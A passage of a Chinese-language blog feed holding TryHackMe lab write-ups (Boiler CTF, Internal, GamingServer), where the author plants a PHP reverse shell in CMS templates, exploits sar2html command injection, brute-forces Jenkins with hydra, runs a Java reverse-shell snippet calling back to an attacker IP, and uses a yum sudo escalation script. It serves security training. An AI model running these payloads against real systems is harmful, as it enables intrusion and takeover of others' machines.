src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152751934-1122413670.png" alt="image-20241008152749484"></p><p>为了方便反弹shell，直接修改index.php文件</p><p>将<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell.php</a>写到文件中，并修改其中的ip和port</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154536026-2069500358.png" alt="image-20241008154533386"></p><p>保存，在kali中起个监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008153222944-538312390.png" alt="image-20241008153220414"></p><p>在页面中访问刚才修改的文件</p><p><code>http://10.10.158.159/templates/beez3/index.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154616790-1766426576.png" alt="image-20241008154614259"></p><p>getshell成功！</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154837476-1061401653.png" alt="image-20241008154835273"></p><p>现在只有一个初始访问权限，还需要横向移动到<code>jjameson</code>用户</p><h1 id="提升至user权限"><a href="#提升至user权限" class="headerlink" title="提升至user权限"></a>提升至user权限</h1><p>先查看文件</p><p><img src="C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241008160838389.png" alt="image-20241008160838389"></p><p>在查看文件的时候发现在 <code>/var/www/html</code>目录下有个<code>configuration.php</code>文件，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161000178-1468348786.png" alt="image-20241008160957808"></p><p>发现有密码<code>nv5uz9r3ZEDzVjNu</code>，貌似是root用户的，ssh登录一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161333840-1625929510.png" alt="image-20241008161331426"></p><p>看样子不是root的密码，尝试ssh登陆<code>jjameson</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161255917-2029099622.png" alt="image-20241008161253699"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161356936-1355687411.png" alt="image-20241008161354772"></p><p>直接在当前页面找到<code>user.txt</code></p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><p>先执行<code>sudo -l</code>看看是否有可利用的</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161550666-1278824895.png" alt="image-20241008161548452"></p><p>可以使用<code>yum</code>提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/x&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[main]</span></span><br><span class="line"><span class="string">plugins=1</span></span><br><span class="line"><span class="string">pluginpath=$TF</span></span><br><span class="line"><span class="string">pluginconfpath=$TF</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/y.conf&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[main]</span></span><br><span class="line"><span class="string">enabled=1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/y.py&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">import yum</span></span><br><span class="line"><span class="string">from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE</span></span><br><span class="line"><span class="string">requires_api_version=&#x27;2.1&#x27;</span></span><br><span class="line"><span class="string">def init_hook(conduit):</span></span><br><span class="line"><span class="string">  os.execl(&#x27;/bin/sh&#x27;,&#x27;/bin/sh&#x27;)</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">sudo yum -c <span class="variable">$TF</span>/x --enableplugin=y</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161921642-247827710.png" alt="image-20241008161919145"></p><p>提权成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008162019148-1120378338.png" alt="image-20241008162016902"></p><p>在<code>/root</code>目录下找到<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> THM </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-Boiler CTF</title>
      <link href="/posts/39dcc2b4.html"/>
      <url>/posts/39dcc2b4.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.20.169</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap --min-rate 10000 -p- -sV -sC 10.10.20.169 -oN reports/namp</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007155138247-2005312162.png" alt="image-20241007155136615"></p><p>发现开放21，80，10000，55007端口，55007端口运行着ssh服务</p><h2 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h2><p>根据nmap的结果发现ftp可以匿名登录</p><p><code>ftp anonymous@10.10.20.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007153623844-1063595684.png" alt="image-20241007153622117"></p><p>发现隐藏文件<code>.info.txt</code>，<code>get</code>下来查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007153723166-2130415327.png" alt="image-20241007153721753"></p><p>内容像是被<code>rot13</code>加密过的，尝试解密</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007154329949-234648714.png" alt="image-20241007154328354"></p><p>解密后发现是一个提示性的文字，告诉我们需要枚举</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007155409570-1133252866.png" alt="image-20241007155407443"></p><p>默认页面是一个<code>apache</code>的初始页面</p><p>先扫描一下目录</p><p><code>gobuster dir -u http://10.10.20.169/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007160930195-2042932885.png" alt="image-20241007160928359"></p><p>发现很多有意思的目录，查看一下</p><h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007161042789-96937162.png" alt="image-20241007161041169"></p><p>给的目录并没有内容返回都是404，重点看下面的一串数据</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162017100-1297401618.png" alt="image-20241007162015403"></p><p>解密后得到另一串数据<code>99b0660cd95adea327c54182baa51584</code></p><p>看起来像md5数据，使用<code>hashcat</code>解密</p><p><code>hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162349391-1423906262.png" alt="image-20241007162347491"></p><p>解出来的数据是<code>kidding</code>，现在看来没什么用</p><h3 id="manual"><a href="#manual" class="headerlink" title="manual"></a>manual</h3><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162655725-2004416225.png" alt="image-20241007162653988"></p><p>是一个<code>apache</code>的文档，可以知道的是版本号是2.4</p><h3 id="joomla"><a href="#joomla" class="headerlink" title="joomla"></a>joomla</h3><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162747852-2035223215.png" alt="image-20241007162746149"></p><p>这是一个cms</p><h1 id="获取初始shell"><a href="#获取初始shell" class="headerlink" title="获取初始shell"></a>获取初始shell</h1><p>刚才知道了是<code>joomla</code>系统，继续深入扫描一下目录</p><p><code>gobuster dir -u http://10.10.20.169/joomla -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007163608399-43319589.png" alt="image-20241007163606266"></p><p>这次目录有点多</p><p>测试后发现只有几个有内容</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007164556241-928049236.png" alt="image-20241007164554560"></p><p>最重要的是这个，在<code>/joomla/_test</code>目录下发现有<a href="https://www.onworks.net/zh-CN/software/app-sar2html">sar2html</a></p><p>使用<code>searchsploit</code>搜索一下相关漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007165329033-1102727197.png" alt="image-20241007165327179"></p><p>用的是第一个，复制到当前目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007165423725-2036887988.png" alt="image-20241007165422004"></p><p>查看内容后发现是在url处控制<code>plot</code>参数，通过值拼接实现RCE，利用一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170011069-1384604430.png" alt="image-20241007170009665"></p><p>命令执行成功</p><p>查看一下<code>log.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170051671-1800575054.png" alt="image-20241007170050140"></p><p>发现<code>basterd</code>用户使用密码 <code>superduperp@$$</code>通过ssh连接机器，我们之前扫描结果中ssh端口发现是55007</p><p>我们使用这个凭据尝试连接</p><p><code>ssh basterd@10.10.20.169 -p 55007</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170420582-601376213.png" alt="image-20241007170418958"></p><p>连接成功，拿到<code>basterd</code>用户的shell</p><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170547184-1714231114.png" alt="image-20241007170545779"></p><p>在<code>/home/basterd</code>目录发现<code>backup.sh</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170641598-69828711.png" alt="image-20241007170639847"></p><p>查看后发现另一个用户<code>stoner</code>，以及密码<code>superduperp@$$no1knows</code>，直接登录<code>stoner</code>用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171143692-1069757611.png" alt="image-20241007171142250"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171247398-1778280610.png" alt="image-20241007171245935"></p><p>在<code>/home/stoner</code>目录下找到隐藏文件<code>.secret</code>，其内容就是<code>user.txt</code></p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171443860-578181515.png" alt="image-20241007171442288"></p><p>并没有什么可以利用的</p><p>使用<code>find</code>看看能否有提权的机会</p><p><code>find / -perm -u=s -type f 2&gt; /dev/null</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171623374-472604132.png" alt="image-20241007171621747"></p><p>发现有find，利用find命令提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171908473-623085440.png" alt="image-20241007171907091"></p><p>提权成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171951300-1248330287.png" alt="image-20241007171949819"></p><p>同样在<code>/root</code>目录下获取到<code>root.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007172145341-43973699.png" alt="image-20241007172143822"></p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> THM </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-Internal</title>
      <link href="/posts/a77e166e.html"/>
      <url>/posts/a77e166e.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.27.141</p></blockquote><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125007253-1199614277.png" alt="image-20241007125005114"></p><p>要将<code>internal.thm</code>添加到<code>/etc/hosts</code> 文件中</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125108994-1194412670.png" alt="image-20241007125107606"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap --min-rate 10000 -sS -sV -sC 10.10.27.141 -oN reports/nmap</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125129049-1554175018.png" alt="image-20241007125127613"></p><p>发现开放22端口和80端口</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125454844-2082201762.png" alt="image-20241007125453302"></p><p>是一个<code>apache</code>的初始页面，扫描一下目录</p><p> <code>gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125552143-1556052638.png" alt="image-20241007125550493"></p><p>访问一下</p><ul><li><code>/blog</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125736845-1392160763.png" alt="image-20241007125734839"></p><ul><li><code>/javascript</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125747452-224993723.png" alt="image-20241007125745983"></p><ul><li><code>/phpmyadmin</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125756599-644411919.png" alt="image-20241007125755191"></p><ul><li><code>/wordpress</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125807763-1396057649.png" alt="image-20241007125806157"></p><p>不难看出，这是一个<code>wordpress</code>的界面，<code>wordpress</code>和<code>blog</code>是一个页面，这里以<code>/blog</code>为主，同时还有个<code>phpMyAdmin</code></p><h1 id="获取初始shell"><a href="#获取初始shell" class="headerlink" title="获取初始shell"></a>获取初始shell</h1><h2 id="登录wordpress"><a href="#登录wordpress" class="headerlink" title="登录wordpress"></a>登录wordpress</h2><p>先看下<code>phpMyAdmin</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007130433898-1261641608.png" alt="image-20241007130432070"></p><p>查看源码发现版本号是<code>4.6.6</code>，通过<code>searchsploit</code>搜索后发现没有什么可以利用的，将注意力转移到<code>wordpress</code></p><p>使用<code>wpscan</code>扫描一下</p><p><code>wpscan --url http://internal.thm/blog/ -e</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007132506908-1533969406.png" alt="image-20241007132505372"></p><p>发现有个admin账户，尝试破解一下密码</p><p><code>wpscan --url http://internal.thm/blog/ -U admin -P /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007133734282-1690665278.png" alt="image-20241007133732602"></p><p>爆破成功，找到了<code>admin</code>账户的密码<code>my2boys</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007133911002-255471056.png" alt="image-20241007133909433"></p><p>成功登录</p><h2 id="shell获取"><a href="#shell获取" class="headerlink" title="shell获取"></a>shell获取</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007134757805-2134124194.png" alt="image-20241007134755947"></p><p>在这里发现可以随意更改文件内容。这里将<code>404.php</code>内容改成反弹shell的文件是<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell</a>，修改<code>ip</code>和<code>port</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135148884-1540858205.png" alt="image-20241007135147307"></p><p>点击下买你的更新文件。然后在kali上创建监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135222394-569063211.png" alt="image-20241007135221038"></p><p>现在需要找到<code>404.php</code>文件的位置，从路由中可以看到主题是<code>twentyseventeen</code>，而且大多数主题位于<code>wp-content</code> 目录下，主题位于<code>/wp-content/themes</code>目录下，所以<code>404.php</code>文件的位置是：<code>/wp-content/themes/twentyseventeen/404.php</code></p><p>访问文件<code>http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135720735-27264363.png" alt="image-20241007135719154"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135738379-51772723.png" alt="image-20241007135736972"></p><p>这样我们就拿到了低权用户的shell</p><p>先获取交互式shell</p><p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135936004-77642626.png" alt="image-20241007135934513"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140015991-900638678.png" alt="image-20241007140014508"></p><p>在<code>/home</code>目录下有个<code>aubreanna</code>用户，现在目标就是提升至user权限</p><h1 id="提升至user权限"><a href="#提升至user权限" class="headerlink" title="提升至user权限"></a>提升至user权限</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140610859-829745507.png" alt="image-20241007140609325"></p><p>在翻阅目录的过程中发现在 <code>/opt</code>目录下有个<code>wp-save.txt</code>文件，并且这是我们可以查看的文件，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140728583-62091955.png" alt="image-20241007140727188"></p><p>得到了<code>aubreanna</code>用户的密码<code>bubb13guM!@#123</code>，登录<code>aubreanna</code>用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140837240-798440971.png" alt="image-20241007140835640"></p><p>成功登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140901515-1447831069.png" alt="image-20241007140900121"></p><p>在<code>/home/aubreanna</code>下找到<code>user.txt</code></p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><p>发现在这个目录还有<code>jenkins.txt</code>文件，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007141130806-1153980717.png" alt="image-20241007141129333"></p><p>告诉我们内网<code>Jenkins</code>服务的地址是<code>172.17.0.2:8080</code></p><p>先简单看一下服务</p><p><code>curl http://172.17.0.2:8080</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007141312485-108597353.png" alt="image-20241007141310725"></p><p>由于目标机器的端口<code>8080</code>只能通过目标机的本地进行访问，所以我们需要设置SSH端口转发，从而将目标机器<code>8080</code>端口上的流量重定向到我们本地攻击机上的地址和端口<code>localhost:8081</code>，在攻击机上的终端界面构造如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -L 8081:172.17.0.2:8080 aubreanna@internal.thm</span><br><span class="line"><span class="comment">#根据前述结果，登录密码为：bubb13guM!@#123</span></span><br><span class="line"><span class="comment">#ssh端口转发(本地网卡地址0.0.0.0可省略)：HostB$ ssh -L 0.0.0.0:PortB:HostC:PortC user@HostC</span></span><br><span class="line"><span class="comment">#参数说明</span></span><br><span class="line"><span class="comment">#-C：压缩数据</span></span><br><span class="line"><span class="comment">#-f ：后台认证用户/密码，通常和-N连用，不用登录到远程主机。</span></span><br><span class="line"><span class="comment">#-N ：不执行脚本或命令，通常与-f连用。</span></span><br><span class="line"><span class="comment">#-g ：在-L/-R/-D参数中，允许远程主机连接到建立转发的端口，如果不加这个参数，只允许本地主机建立连接。</span></span><br><span class="line"><span class="comment">#-L : 本地隧道，本地端口:目标IP:目标端口</span></span><br><span class="line"><span class="comment">#-D : 动态端口转发</span></span><br><span class="line"><span class="comment">#-R : 远程隧道</span></span><br><span class="line"><span class="comment">#-T ：不分配 TTY 只做代理用</span></span><br><span class="line"><span class="comment">#-q ：安静模式，不输出 错误/警告 信息</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007143027902-1109898380.png" alt="image-20241007143026526"></p><p>输入密码后即可访问服务</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007143014999-1246675905.png" alt="image-20241007143013118"></p><p>网上的默认密码无法登录，这里使用<code>hydra</code>暴力破解，先找到登录框的表单内容</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007144307417-1663244639.png" alt="image-20241007144305568"></p><p>找到后就可以构造命令了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8081 127.0.0.1 http-post-form &quot;/j_acegi_security_check:j_username=admin&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&quot;</span><br><span class="line"></span><br><span class="line">#&quot;/j_acegi_security_check:j_username=admin&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:F=Invalid username or password&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145155569-23242268.png" alt="image-20241007145153970"></p><p>成功爆破出密码<code>spongebob</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145245979-419572187.png" alt="image-20241007145244248"></p><p>成功登录！</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145414836-343618295.png" alt="image-20241007145413172"></p><p>在管理界面，有一个可以执行命令的地方，在攻击机先建立监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145514017-720666410.png" alt="image-20241007145512664"></p><p>然后再执行反弹shell的命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String host=<span class="string">&quot;10.11.101.220&quot;</span>;</span><br><span class="line"><span class="type">int</span> port=<span class="number">8889</span>;</span><br><span class="line">String cmd=<span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">Process p=<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).redirectErrorStream(<span class="literal">true</span>).start();Socket s=<span class="keyword">new</span> <span class="title class_">Socket</span>(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.exitValue();<span class="keyword">break</span>;&#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145627071-645137157.png" alt="image-20241007145625573"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145649065-1090977695.png" alt="image-20241007145647641"></p><p>拿到<code>jenkins</code>的shell</p><p>转到交互式shell</p><p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145819229-990567029.png" alt="image-20241007145817874"></p><p>依旧是在老位置<code>/opt</code>下找到<code>note.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145855094-105871939.png" alt="image-20241007145853700"></p><p>得到<code>root</code>用户的密码：<code>tr0ub13guM!@#123</code></p><p>直接<code>ssh</code>登录<code>root</code></p><p><code>ssh root@10.10.27.141</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007150058524-1354823152.png" alt="image-20241007150056965"></p><p>成功登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007150120478-264508902.png" alt="image-20241007150119151"></p><p>在当前目录找到<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> THM </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-GamingServer</title>
      <link href="/posts/91bbca54.html"/>
      <url>/posts/91bbca54.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.121.5</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap --min-rate 10000 -sS -sV -sC 10.10.121.5</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142138386-1644378651.png" alt="image-20241006142136365"></p><p>只开放了22和80端口</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>![image-20241C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241006142532131.png)</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142535295-1944826601.png" alt="image-20241006142533235"></p><p>非常炫酷的界面</p><p>浏览之后发现在<code>http://10.10.121.5/about.html#</code> 下，有个<code>upload</code>按钮，点击一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142812327-1270244026.png" alt="image-20241006142810609"></p><p>这时候发现就跳转到了可以浏览目录的页面</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142836482-132291457.png" alt="image-20241006142835118"></p><p>在<code>dict.lst</code>中是一个字典</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142914037-561726342.png" alt="image-20241006142912365"></p><p>将其下载到本地，留着以后可能用得上</p><p><code>manifesto.txt</code>内容如下，是一封信</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006143159087-987491040.png" alt="image-20241006143157410"></p><p>得到一个用户名<code>Mentor</code></p><p>现在我们有了一个用户名和一个密码字典，之前端口探测的时候，发现22端口是开放的，我们可以尝试通过爆破<code>ssh</code>密码尝试登录</p><h1 id="获取普通权限"><a href="#获取普通权限" class="headerlink" title="获取普通权限"></a>获取普通权限</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006144348962-739972565.png" alt="image-20241006144347297"></p><p>很可惜，没有破解成功，继续尝试扫描一下目录</p><p><code>gobuster dir -u http://10.10.121.5/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006144925900-1562652202.png" alt="image-20241006144924456"></p><p>发现有几个特别的信息，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006145023295-181828212.png" alt="image-20241006145021856"></p><p><code>robots.txt</code>里的信息并不太重要，因为我们之前点击<code>upload</code>访问过这个目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006145111847-955401844.png" alt="image-20241006145110462"></p><p>这个<code>/secret</code>目录是个新目录，之前没有找到，查看一下<code>secretKey</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006145149070-1566565554.png" alt="image-20241006145147571"></p><p>发现这是<code>RSA</code>私钥文件，下载下来保存为<code>id_rsa</code>并赋予<code>600</code>权限，爆破加密私钥的密码</p><p>先将<code>id_rsa</code>转换为hash格式</p><p><code>ssh2john id_rsa &gt; rsa_hash</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006150305820-1630075297.png" alt="image-20241006150304289"></p><p>使用<code>john</code>开始爆破</p><p><code>john rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p>使用<code>john rsa_hash --show</code>查看结果</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006150549966-1727897226.png" alt="image-20241006150548683"></p><p>找到密码<code>letmein</code>，使用ssh私钥登录</p><p><code>ssh Mentor@10.10.121.5 -i id_rsa</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006151533269-1114822329.png" alt="image-20241006151531886"></p><p>登陆后还是失败了，肯定是之前有哪些信息没有注意到</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006151645250-647968347.png" alt="image-20241006151643801"></p><p>在首页源码处发现另一个用户<code>john</code>，使用这个用户尝试登录</p><p><code>ssh john@10.10.121.5 -i id_rsa</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006151828540-1248866941.png" alt="image-20241006151827027"></p><p>登陆成功，看来之前的那封信只是一封信而已</p><p><img 